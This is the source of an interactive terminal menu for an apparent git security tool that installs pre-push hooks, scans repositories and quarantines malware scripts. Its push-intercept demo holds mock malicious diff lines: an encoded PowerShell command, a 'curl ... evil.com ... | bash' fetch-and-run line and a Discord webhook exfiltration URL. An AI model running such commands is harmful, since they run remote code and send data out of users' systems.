const readline = require('readline');
const { banner, colors } = require('./reporter');
const { runManualScan, installHook, uninstallHook } = require('./index');
const { cleanInfectedFiles } = require('./cleaner');
const { setupGitHubAction } = require('./action');
const { scanRemoteRepositoryZeroClone, printRemoteScanReport } = require('./remoteScanner');
const { scanFilesAndDiff } = require('./scanner');
const { printReport, printBlockMessage } = require('./reporter');

/**
 * Runs an interactive numbered menu in terminal
 */
async function runInteractiveMenu() {
  banner();

  console.log(`\n${colors.bold}${colors.cyan}Select an action to perform:${colors.reset}\n`);
  console.log(`  ${colors.green}[1]${colors.reset} 🛡️  ${colors.bold}Install Local Hook${colors.reset}       - Protect current repository`);
  console.log(`  ${colors.green}[2]${colors.reset} 🌐  ${colors.bold}Install Global Hook${colors.reset}      - Lock down ALL git repos across this PC`);
  console.log(`  ${colors.green}[3]${colors.reset} 🔍  ${colors.bold}Scan Local Workspace${colors.reset}    - Audit staged & untracked files for threats`);
  console.log(`  ${colors.green}[4]${colors.reset} 🚀  ${colors.bold}Scan Remote GitHub Repo${colors.reset} - Zero-clone audit (no download/clone)`);
  console.log(`  ${colors.green}[5]${colors.reset} 🧹  ${colors.bold}Clean & Quarantine${colors.reset}      - Remove temp_*_push.bat & trojan scripts`);
  console.log(`  ${colors.green}[6]${colors.reset} ⚡  ${colors.bold}Run Push Intercept Demo${colors.reset} - Simulate a blocked malware push`);
  console.log(`  ${colors.green}[7]${colors.reset} 🤖  ${colors.bold}Setup GitHub Action CI${colors.reset}  - Guard repository on GitHub server-side`);
  console.log(`  ${colors.green}[8]${colors.reset} ❌  ${colors.bold}Uninstall Hook${colors.reset}          - Remove pre-push hook`);
  console.log(`  ${colors.dim}[0] 🚪  Exit${colors.reset}\n`);

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  const choice = await new Promise((resolve) => {
    rl.question(`${colors.bold}${colors.yellow}Enter your choice (1-8, 0 to exit): ${colors.reset}`, (ans) => {
      rl.close();
      resolve(ans.trim());
    });
  });

  switch (choice) {
    case '1': {
      console.log(`\n${colors.cyan}Installing local pre-push hook...${colors.reset}`);
      const res = installHook(process.cwd(), false);
      if (res.success) {
        console.log(`\n${colors.green}${colors.bold}✔ ${res.message}${colors.reset}\n`);
      } else {
        console.error(`\n${colors.red}${colors.bold}✖ ${res.message}${colors.reset}\n`);
      }
      break;
    }

    case '2': {
      console.log(`\n${colors.cyan}Installing GLOBAL pre-push hook for all repositories...${colors.reset}`);
      const res = installHook(process.cwd(), true);
      if (res.success) {
        console.log(`\n${colors.green}${colors.bold}✔ ${res.message}${colors.reset}\n`);
      } else {
        console.error(`\n${colors.red}${colors.bold}✖ ${res.message}${colors.reset}\n`);
      }
      break;
    }

    case '3': {
      runManualScan();
      break;
    }

    case '4': {
      const askRl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
      });

      const repoUrl = await new Promise((resolve) => {
        askRl.question(`\n${colors.bold}${colors.cyan}? Enter GitHub Repository URL (e.g. https://github.com/owner/repo): ${colors.reset}`, (ans) => {
          askRl.close();
          resolve(ans.trim());
        });
      });

      if (!repoUrl) {
        console.log(`${colors.red}No URL entered. Aborted.${colors.reset}\n`);
        return;
      }

      console.log(`\n${colors.cyan}Starting Zero-Clone In-Memory Security Audit...${colors.reset}`);
      try {
        const result = await scanRemoteRepositoryZeroClone(repoUrl, null, (msg) => {
          console.log(`  ${colors.dim}ℹ ${msg}${colors.reset}`);
        });
        printRemoteScanReport(result);
      } catch (err) {
        console.error(`\n${colors.red}${colors.bold}✖ Scan Failed:${colors.reset} ${err.message}\n`);
      }
      break;
    }

    case '5': {
      console.log(`\n${colors.cyan}Scanning workspace for injected malware scripts to quarantine...${colors.reset}`);
      const cleanResult = cleanInfectedFiles();
      if (cleanResult.quarantined.length > 0) {
        console.log(`\n${colors.yellow}${colors.bold}⚠ Quarantined ${cleanResult.quarantined.length} malicious file(s):${colors.reset}`);
        for (const q of cleanResult.quarantined) {
          console.log(`   ${colors.red}✖ ${q}${colors.reset}`);
        }
        console.log(`\n${colors.green}${colors.bold}✔ Cleaned from staging area and moved to quarantine folder (.git/git-safty-quarantine/).${colors.reset}\n`);
      } else {
        console.log(`\n${colors.green}${colors.bold}✔ No known malware scripts found in project files.${colors.reset}\n`);
      }
      break;
    }

    case '6': {
      console.log(`\n${colors.cyan}Simulating a malicious push intercept test...${colors.reset}\n`);
      const mockFiles = ['src/app.js', 'temp_auto_push.bat', '.vscode/tasks.json'];
      const mockDiff = `+ powershell.exe -enc SQBFAFgAIAAoAE4AZQB3...
+ curl -fsSL https://evil.com/hook.sh | bash
+ const webhook = "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";`;

      const result = scanFilesAndDiff(mockFiles, mockDiff);
      printReport(result);
      printBlockMessage();
      console.log(`${colors.green}${colors.bold}✔ Simulation Complete:${colors.reset} In a real git push, GitSafty will immediately exit 1 and reject the push!\n`);
      break;
    }

    case '7': {
      const res = setupGitHubAction();
      if (res.success) {
        console.log(`\n${colors.green}${colors.bold}✔ ${res.message}${colors.reset}\n`);
      } else {
        console.error(`\n${colors.red}${colors.bold}✖ ${res.message}${colors.reset}\n`);
      }
      break;
    }

    case '8': {
      const res = uninstallHook();
      if (res.success) {
        console.log(`\n${colors.yellow}${colors.bold}✔ ${res.message}${colors.reset}\n`);
      } else {
        console.error(`\n${colors.red}${colors.bold}✖ ${res.message}${colors.reset}\n`);
      }
      break;
    }

    case '0':
    default:
      console.log(`\n${colors.dim}Goodbye! 🛡️${colors.reset}\n`);
      break;
  }
}

module.exports = {
  runInteractiveMenu
};
